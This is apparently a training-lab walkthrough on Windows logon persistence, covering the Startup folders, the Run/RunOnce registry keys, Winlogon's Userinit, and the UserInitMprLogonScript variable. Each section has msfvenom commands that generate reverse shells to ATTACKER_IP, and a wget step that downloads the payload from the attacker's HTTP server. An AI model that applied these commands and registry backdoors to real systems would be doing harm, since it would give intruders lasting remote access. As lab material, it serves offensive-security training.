Some actions performed by a user might also be bound to executing specific payloads for persistence. Windows operating systems present several ways to link payloads with particular interactions. This task will look at ways to plant payloads that will get executed when a user logs into the system.

## Startup folder

Each user has a folder under `C:\Users\<your_username>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup` where you can put executables to be run whenever the user logs in. An attacker can achieve persistence just by dropping a payload in there. Notice that each user will only run whatever is available in their folder.

If we want to force all users to run a payload while logging in, we can use the folder under `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` in the same way.

For this task, let's generate a reverse shell payload using msfvenom:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4450 -f exe -o revshell.exe
```

We will then copy our payload into the victim machine. You can spawn an `http.server` with Python3 and use wget on the victim machine to pull your file:

```shell
user@AttackBox$ python3 -m http.server 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ... 
```

```shell
PS C:\> wget http://ATTACKER_IP:8000/revshell.exe -O revshell.exe
```

We then store the payload into the `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp` folder to get a shell back for any user logging into the machine.

```shell
C:\> copy revshell.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\"
```

Now be sure to sign out of your session from the start menu (closing the RDP window is not enough as it leaves your session open):

And log back via RDP. You should immediately receive a connection back to your attacker's machine.

## Run / RunOnce

You can also force a user to execute a program on logon via the registry. Instead of delivering your payload into a specific directory, you can use the following registry entries to specify applications to run at logon:

- `HKCU\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`
- `HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce`

The registry entries under `HKCU` will only apply to the current user, and those under `HKLM` will apply to everyone. Any program specified under the `Run` keys will run every time the user logs on. Programs specified under the `RunOnce` keys will only be executed a single time.

For this task, let's create a new reverse shell with msfvenom:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4451 -f exe -o revshell.exe
```

After transferring it to the victim machine, let's move it to `C:\Windows\`:

```shell
C:\> move revshell.exe C:\Windows
```

Let's then create a `REG_EXPAND_SZ` registry entry under `HKLM\Software\Microsoft\Windows\CurrentVersion\Run`. The entry's name can be anything you like, and the value will be the command we want to execute.

**Note:** While in a real-world set-up you could use any name for your registry entry, for this task you are required to use `MyBackdoor` to receive the flag.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).

## Winlogon

Another alternative to automatically start programs on logon is abusing Winlogon, the Windows component that loads your user profile right after authentication (amongst other things).

Winlogon uses some registry keys under `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\` that could be interesting to gain persistence:

- `Userinit` points to `userinit.exe`, which is in charge of restoring your user profile preferences.
- `shell` points to the system's shell, which is usually `explorer.exe`.

![](./img/Pasted%20image%2020240203120127.png)

If we'd replace any of the executables with some reverse shell, we would break the logon sequence, which isn't desired. Interestingly, you can append commands separated by a comma, and Winlogon will process them all.

Let's start by creating a shell:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4452 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```shell
C:\> move revshell.exe C:\Windows
```

We then alter either `shell` or `Userinit` in `HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\`. In this case we will use `Userinit`, but the procedure with `shell` is the same.

**Note:** While both `shell` and `Userinit` could be used to achieve persistence in a real-world scenario, to get the flag in this room, you will need to use `Userinit`.

![](./img/Pasted%20image%2020240203120212.png)

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).

## Logon scripts

One of the things `userinit.exe` does while loading your user profile is to check for an environment variable called `UserInitMprLogonScript`. We can use this environment variable to assign a logon script to a user that will get run when logging into the machine. The variable isn't set by default, so we can just create it and assign any script we like.

Notice that each user has its own environment variables; therefore, you will need to backdoor each separately.

Let's first create a reverse shell to use for this technique:

```shell
user@AttackBox$ msfvenom -p windows/x64/shell_reverse_tcp LHOST=ATTACKER_IP LPORT=4453 -f exe -o revshell.exe
```

We'll transfer the shell to our victim machine as we did previously. We can then copy the shell to any directory we like. In this case, we will use `C:\Windows`:

```shell
C:\> move revshell.exe C:\Windows
```

To create an environment variable for a user, you can go to its `HKCU\Environment` in the registry. We will use the `UserInitMprLogonScript` entry to point to our payload so it gets loaded when the users logs in:

![](./img/Pasted%20image%2020240203120310.png)

Notice that this registry key has no equivalent in `HKLM`, making your backdoor apply to the current user only.

After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10 seconds).
